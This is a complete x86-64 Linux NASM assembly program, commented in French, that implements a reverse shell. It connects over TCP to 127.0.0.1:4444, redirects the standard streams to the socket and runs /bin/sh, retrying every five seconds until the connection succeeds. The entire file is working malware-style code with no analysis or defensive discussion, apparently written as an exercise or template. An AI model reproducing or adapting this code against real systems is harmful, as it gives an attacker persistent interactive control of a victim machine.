section .data
    ; Structure socket (16 octets)
    ; 127.0.0.1:4444(little endian)

    socket:
        dw 2                      
        dw 0x5c11                 ; port
        dd 0x0100007f             ; ip
        dq 0                      ; sin_zero (padding inutilisé)

    ; Structure timespec pour nanosleep (5 secondes)
    timespec:
        dq 5      ; secondes
        dq 0      ; nanosecondes

section .text
    global _start

_start:
.connexion:
    mov     rax, 41              ; syscall socket
    mov     rdi, 2               ; domaine = AF_INET
    mov     rsi, 1               ; type = SOCK_STREAM (TCP)
    xor     rdx, rdx             ; protocole = 0
    syscall

    cmp     rax, 0
    jl      .attente             ; si erreur, attendre et réessayer

    mov     rdi, rax             ; sauvegarde fd dans rdi
    mov     r12, rax             ; conserve socket pour dup2


    lea     rsi, [rel socket]  
    mov     rdx, 16              
    mov     rax, 42              ; syscall connect
    syscall

    cmp     rax, 0
    jl      .attente             ; si connect échoue, attendre et retester

    ; dup2 redirige stdin, stdout, stderr vers le socket
    xor     rsi, rsi

.dup_loop:
    mov     rax, 33              ; syscall dup2
    mov     rdi, r12             ; oldfd = socket
    syscall

    inc     rsi
    cmp     rsi, 3
    jne     .dup_loop

    ; execve(reverse shell)
    xor     rax, rax
    push    rax                  ; NULL
    mov     rbx, 0x68732f6e69622f2f ; "//bin/sh" en little endian
    push    rbx
    mov     rdi, rsp             ; pointeur vers "/bin/sh"
    push    rax                  ; NULL
    push    rdi                  ; argv[0]
    mov     rsi, rsp             ; argv = ["/bin/sh", NULL]
    xor     rdx, rdx             ; envp = NULL
    mov     rax, 59              ; syscall execve
    syscall

.erreur:
    ; Sortie avec code erreur 1
    mov     rax, 60
    mov     rdi, 1
    syscall

.attente:
    mov     rax, 35              ; syscall nanosleep
    lea     rdi, [rel timespec]  ; pointeur vers {5, 0}
    xor     rsi, rsi 
    syscall
    jmp     .connexion           ; reteste
